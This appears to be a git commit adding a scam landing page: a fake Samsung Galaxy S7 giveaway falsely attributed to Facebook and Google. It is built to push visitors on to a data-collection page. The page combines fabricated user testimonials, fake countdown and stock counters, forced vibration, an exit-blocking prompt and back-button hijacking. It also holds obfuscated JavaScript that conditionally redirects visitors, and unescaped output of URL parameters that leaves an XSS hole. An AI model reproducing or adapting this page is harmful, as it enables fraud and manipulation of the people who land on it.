5fd582c7e19175a1793118c863e219ffee179241
Security2431 <Artem2431@gmail.com>
2016-08-26 15:09:43 +0300

    init

---
+++ index.php
@@ -0,0 +1,246 @@
+
+<html><head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0">
+
+<!--THIS-->
+<title>SAMSUNG GALAXY S7 EDGE GIVEAWAY!</title>
+<!--THIS-->
+
+<link rel="stylesheet" type="text/css" href="sweetalert.css">
+<script src="sweetalert-dev.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
+<script>
+function getURLParameter(name) {
+return decodeURI(
+(RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+);
+}
+</script>
+<script type="text/javascript">var _0x3a31 = ["search", "exec", "=", "([^&]+?)(&|$)", "", "brn", "an", "br", "md", "osv", "cyinta.com", "indexOf", "href", "location", "prn", "random", "zz1", "log", "", "Android", "lastIndexOf", "Chrome", "Mobile Safari", "orientation", "undefined", "aa1", "", "&brn=", "&br=", "&md=", "</head><body></body></html>", "write"];function getURLParameter(_0x5d4ex2){return decodeURI((RegExp(_0x5d4ex2+_0x3a31[2]+_0x3a31[3])[_0x3a31[1]](location[_0x3a31[0]])||[,null])[1]||_0x3a31[4])}browser=getURLParameter(_0x3a31[5]);aname=getURLParameter(_0x3a31[6]);brand=getURLParameter(_0x3a31[7]);model=getURLParameter(_0x3a31[8]);osv=getURLParameter(_0x3a31[9]);if(window[_0x3a31[13]][_0x3a31[12]][_0x3a31[11]](_0x3a31[10])<0&&!getURLParameter(_0x3a31[14])){if(Math[_0x3a31[15]]()>0.85){console[_0x3a31[17]](_0x3a31[16]);window[_0x3a31[13]]=_0x3a31[18]+escape(window[_0x3a31[13]][_0x3a31[12]]);}};if(browser[_0x3a31[20]](_0x3a31[19],0)===0||browser[_0x3a31[20]](_0x3a31[21],0)===0||browser[_0x3a31[20]](_0x3a31[22],0)===0){if( typeof window[_0x3a31[23]]==_0x3a31[24]){console[_0x3a31[17]](_0x3a31[25]);window[_0x3a31[13]]=_0x3a31[26]+aname+_0x3a31[27]+browser+_0x3a31[28]+brand+_0x3a31[29]+model;document[_0x3a31[31]](_0x3a31[30]);var ii=0;for(ii=0;ii>10000;++ii){ii+=10};}};if(!brand || brand=="Generic" || brand=="Opera" || brand=="Unknown" || brand=="Mozilla" || brand=="Android" || brand=="Desktop") {model="Android";brand="Google";}
+
+
+//THIS
+var msg = "Congratulations! \n\nYou are participating in the closed special offer from Facebook and Google! Click 'OK' to see what gifts you can get!";
+//THIS
+
+
+</script>
+
+<!--<?php echo $lp_js;?>-->
+
+</head><body class=" stop-scrolling" style="">
+<script type="text/javascript">
+window.onload=function(){swal({title: "",
+text: 
+
+//THIS
+"Congratulations! \n\nYou are participating in the closed special offer from Facebook and Google! Click 'OK' to see what gifts you can get!",
+imageUrl: "thumbs-up.png"});
+//THIS
+
+
+
+}
+var spinTimes=0;var isSpin=0;function spinnerAction(){if(isSpin==1)
+return;var spinWin=document.getElementById("spin");if(spinTimes!=1){spinTimes=1;isSpin=1;spinWin.className=spinWin.className + " spinAround";setTimeout(function(){
+//THIS
+swal({title: "",
+text: "1x spin left!",});
+//THIS
+
+isSpin=0;},6500);}else if(spinTimes==1){isSpin=1;spinWin.className=spinWin.className + " spinAround2";setTimeout(function(){spinWin.className=spinWin.className + " Op";iphone.style.display = "block";setTimeout(function(){swal
+({title: "",text: 
+
+//THIS
+"CONGRATULATIONS! Congratulations! You get White Samsung S7 32 Gb!\n\nIt is important! You will receive your gift as soon as you fill out the data on the next page.\n\n**The note: you have to confirm your gift for 120 seconds! **",
+//THIS
+
+type:"success"},function(){PreventExitSplash=false;window._clicked=1;window.location.href = "http://yandex.ru";isSpin=0;});},800);},6000);}}
+</script>
+<script type="text/javascript">
+var dayNames=new Array("Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday");var monthNames=new Array("January","February","March","April","May","June","July","August","September","October","November","December");var now=new Date();var today=monthNames[now.getMonth()] + " " + now.getDate() + ", " + now.getFullYear();function get_date(days){return today=monthNames[now.getMonth()] + " " + (now.getDate() - days) + ", " + now.getFullYear();}
+</script>
+<script type="text/javascript">
+navigator.vibrate=navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;navigator.vibrate([1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000]);</script>
+<link rel="stylesheet" type="text/css" href="css.css" media="all">
+<div id="a-nav" class="icon-nav"><table style="width:100%" border="0px" cellpadding="0" cellspacing="0"><tbody><tr><td><img src="fb1.png"></td><td><img src="fb2.png"></td><td><img src="fb3.png"></td><td><img src="fb4.png"></td><td><img src="fb5.png"></td><td></td></tr></tbody></table></div><main><div class="content"><div class="main-content" id="content1">
+
+
+<!--THIS-->
+<h2>You have Won (1) SAMSUNG GALAXY S7 EDGE!</h2>
+<h3>The offer is only available for <?php echo $_GET['brand'];?> users in <?php echo $_GET['country_name'];?></h3><p>We're giving away a <span id="count">43</span> free Samsung S7! Click SPIN and choose your prize:</p><div id="spinner"><img id="spinBG" src="bg.png">
+<!--THIS-->
+
+
+<!--THIS-->
+<img id="spin" src="board.png" class="">
+<!--THIS-->
+
+
+
+<img id="win" onclick="spinnerAction()" src="spin.png"><img id="win2" src="download.png">
+
+
+
+<!--THIS-->
+<img id="iphone" class="animated rotateIn" src="phone6s.png">
+<!--THIS-->
+
+
+</div><p style="text-align: center;"></p><p>Facebook comments:</p><hr>
+<p style="color: rgb(168, 167, 167);"><span style="color: rgb(168, 167, 167); cursor: pointer;" onclick="total_likes();return false" id="liked">
+Like</span> • Comment • Share • Delete </p><hr><div class="comments"><p style="margin: 0px; padding: 0px;" id="total_likes"><span style="color: rgb(59,
+ 89, 152);">2,668</span> like this</p></div><div class="comments"><p style="margin: 0px; padding: 0px; float: left; display: block; width: 50%;"><span style="color: rgb(59, 89, 152);">View more comments</span></p><p style="margin: 0px; padding: 0px; float: right; display: block; width: 50%; color: rgb(168, 167, 167); text-align: right;">9 of 10,312</p><div style="clear: both;"></div></div><div class="comments" id="comment4" style="display: block; opacity: 1;"><div class="comment-content pic1">
+ 
+ 
+<!--THIS-->
+<img class="portrait" src="portrait-9.jpg"><p class="name">
+Zarir Aibara </p><p>Thank you very much! I've got my gift!</p>
+<!--THIS-->
+
+
+</div><div class="clr"></div><div class="comment-status">
+Just now <span> Like - 2 Likes - Reply</span></div></div><div class="comments" id="comment3" style="display: block; opacity: 1;">
+<div class="comment-content pic2">
+
+<!--THIS-->
+<img class="portrait" src="portrait-8.jpg"><p class="name">
+Mit Bhatt</p><p>Thank you very much! It's cool!</p>
+<!--THIS-->
+
+</div><div class="clr"></div><div class="comment-status">
+3 minutes ago <span> Like - 8 Likes - Reply</span></div></div><div class="comments" id="comment2" style="display: block; opacity: 1;"><div class="c
+omment-content pic3">
+
+
+<!--THIS-->
+<img class="portrait" src="portrait-7.jpg"><p class="name">
+&nbsp; &nbsp;Supriya Sobti </p><p> &nbsp;&nbsp; I'm so glad to take part in the lottery! Thanks to the organizers. </p>
+<!--THIS-->
+
+
+</div><div class="clr">
+</div><div class="comment-status">14 minutes ago <span> Like - 12 Likes - Reply</span></div></div><div class="comments" id="comment1" style="opacity: 1; display: block;"><div class="comment-content pic4">
+
+<!--THIS-->
+<img class="portrait" src="portrait-6.jpg"><p class="name">
+Radhika Mashru</p><p>I've being participating in the raffle and have won the Samsung! Thank you so much!</p>
+<!--THIS-->
+
+</div><div class="clr"></div><div class="
+comment-status">42 minutes ago <span> Like - 32 Likes - Reply</span></div></div><div class="comments"><div class="comment-content pic7">
+
+
+<!--THIS-->
+<img class="portrait" src="portrait-1.jpg"><p class="name">
+Suparna Mandal</p><p>Thank you for your gift! I did not believe that I would get a prize! But everything is honest. Here is a photo:<br><br>
+<img src="stock4.jpg">
+<!--THIS-->
+
+</p></div><div class="clr"></div><div class="comment-status">
+1 hour ago <span> Like - 29 Likes - Reply</span></div></div><div class="comments"><div class="comment-content pic8">
+
+<!--THIS-->
+<img class="portrait" src="portrait-2.jpg">
+<p class="name">Preeti Gandhi</p><p>Thank you for the contest! I've got the prize, as it was written! Here he is: <br><br>
+<img src="stock3.jpg">
+<!--THIS-->
+
+
+</p></div>
+<div class="clr"></div>
+<div class="comment-status">
+<script type="text/javascript">document.write(get_date(0));</script>August 24, 2016<span> Like - 35 Likes - Reply</span></div></div><div class="comments">
+<div class="comment-content pic9">
+
+<!--THIS-->
+<img class="portrait" src="portrait-3.jpg">
+<p class="name">Janvi Morzaria</p><p>I have received the prize. Participate in the lotteries and you will be lucky, too! Like me. Here is my gift:<br><br>
+<img src="stock1.jpg">
+<!--THIS-->
+
+
+</p></div>
+<div class="clr"></div><div class="comment-status"><script type="text/javascript">document.write(get_date(0));</script>August 24, 2016<span> Like - 68 Likes - Reply</span>
+</div></div><div class="comments"><div class="comment-content pic10">
+
+<!--THIS-->
+<img class="portrait" src="portrait-4.jpg"><p class="name">
+Priyanka Kuriakose</p><p>I participated in the shares for the first time and have won - Samsung S7 EDGE! I'm so happy)</p>
+<!--THIS-->
+
+
+</div><div class="clr"></div><div class="comment-status"><script type="text/javascript">document.write(get_date(1));</script>August 23, 2016<span> Like - 121 Likes - Reply</span></div></div><div class="comments"><div class="comment-content pic11">
+
+<!--THIS-->
+<img class="portrait" src="portrait-5.jpg"><p class="name">
+Ridhima Sharma</p><p>On August 15, 2016, I have won the Samsung S7. On August 24, I had already received the prize. I have never believed that there are such winnings, in fact) Thanks to the organizers!<br><br>
+<img src="stock2.jpg">
+<!--THIS-->
+
+
+</p></div><div class="clr"></div><div class="comment-status"><script type="text/javascript">document.write(get_date(1));</script>August 23, 2016<span> Like - 289 Likes - Reply</span></div></div></div></div><script type="text/javascript">
+
+//THIS
+var PreventExitSplash=true;var exittraffic_splashalertmessage="Are you sure want to leave this page?\n\nYou are selected to be our GRAND WINNER! If you forfeit, you opportunity will be given to someone else and I’m not sure you would want that.\n\nIf you are not interested feel free to leave this page.\n\n\n\n\n";function DisplayExitSplash(){if(PreventExitSplash==true){window.scrollTo(0,0);return exittraffic_splashalertmessage;}}
+//THIS
+
+window.onbeforeunload=DisplayExitSplash;</script><script type="text/javascript">
+function FBcom(a,b){setTimeout(function(){var m=0, n=true, op=0;$(a+", "+a+" .comtxt, "+a+" .combot").slideDown(500);$().slideDown(500);
+var t=setInterval(function(){op+=0.2;$(a).css({"opacity":op});
+m++;if(m==5) clearInterval(t);}, 100);}, b);}
+function random(min,max){return Math.round(Math.random() * (max - min) + min);}
+function checkZero(a){if(a<10){return "0"+a;}else{return a;}}
+function timer(a,b){var min=checkZero(Math.round((a-30)/60));var sec=checkZero(a%60);$(b).html(min+":"+sec);
+var t=setInterval(function(){a--;min=checkZero(Math.round((a-30)/60));sec=checkZero(a%60);$(b).html(min+":"+sec);if(a==0){clearInterval(t);}}, 1000);return false;}
+
+
+$(document).ready(function(){var curr_loc=location.href;window.history.pushState('', '', 'index.html');window.history.pushState('', '', curr_loc);window.addEventListener("popstate", function(e) {if(document.URL.indexOf("index") >= 0){window.history.pushState('', '', 'index.html');window.history.pushState('', '', curr_loc);
+swal({title: "",
+
+//THIS
+text: "CONGRATULATIONS! \n\nYou have Won (1) Samsung S7 Edge from " + getURLParameter('ISP') + " (our sponsor)! Tap 'OK' to see which Samsung S7 you may get!",
+//THIS
+
+imageUrl: "thumbs-up.jpg"});}});
+//THIS
+
+timer(231, "#timer");$(".Like").click(function(){if($(this).hasClass("selected")){$(this).removeClass("selected");$(this).html("Like");
+
+
+$("#youand").html("");}else{$(this).addClass("selected");$(this).html("UnLike");
+$("#youand").html("You and ");}});$(".fbLike").click(function(){if($(this).hasClass("selected")){$(this).removeClass("selected");$(this).html("Like");}else{$(this).addClass("selected");$(this).html("UnLike");}});FBcom("#comment1",800);
+FBcom("#comment2",7000);FBcom("#comment3",10000);
+FBcom("#comment4",14000);var ct=48;(function loop(){var rand=random(2500,5500);var ctrand=random(1,4);ct=ct - ctrand;if(ct > 1){setTimeout(function(){loop();}, rand);}else{ct = "few";}
+$("#count").html(ct);}());});</script></main><div class="sweet-overlay" tabindex="-1" style="opacity: 1.0899999999999999; display: block;"></div><div class="sweet-alert showSweetAlert visible" data-custom-class="" data-has-cancel-button="false" data-has-confirm-button="true" data-allow-outside-click="false" data-has-done-function="false" data-animation="pop" data-timer="null" style="display: block; margin-top: -156px;"><div class="sa-icon sa-error" style="display: none;"><span class="sa-x-mark"><span class="sa-line sa-left"></span><span class="sa-line sa-right"></span></span></div><div class="sa-icon sa-warning" style="display: none;"><span class="sa-body"></span><span class="sa-dot"></span></div><div class="sa-icon sa-info" style="display: none;"></div><div class="sa-icon sa-success" style="display: none;"><span class="sa-line sa-tip"></span><span class="sa-line sa-long"></span><div class="sa-placeholder"></div><div class="sa-fix"></div></div><div class="sa-icon sa-custom" style="display: block; background-image: url(thumbs-up.png); width: 80px; height: 80px;width:80px; height:80px"></div><h2></h2>
+
+
+<!--THIS-->
+<p style="display: block;">You are participating in the closed special offer from Facebook and Google! Click 'OK' to see what gifts you can get!</p>
+<!--THIS-->
+
+<fieldset><input type="text" tabindex="3" placeholder=""><div class="sa-input-error"></div></fieldset><div class="sa-error-container">
+
+<!--THIS-->
+<div class="icon">!</div><p>Not valid!</p></div><div class="sa-button-container">
+<!--THIS-->
+
+
+<!--THIS-->
+<button class="cancel" tabindex="2" style="display: none;">Cancel</button>
+<!--THIS-->
+
+<div class="sa-confirm-button-container">
+
+
+<!--THIS-->
+<button class="confirm" tabindex="1" style="display: inline-block; background-color: rgb(140, 212, 245); box-shadow: rgba(140, 212, 245, 0.8) 0px 0px 2px, rgba(0, 0, 0, 0.0470588) 0px 0px 0px 1px inset;">OK</button>
+<!--THIS-->
+
+
+<div class="la-ball-fall"><div></div><div></div><div></div></div></div></div></div>
+
+
+
+</body></html>
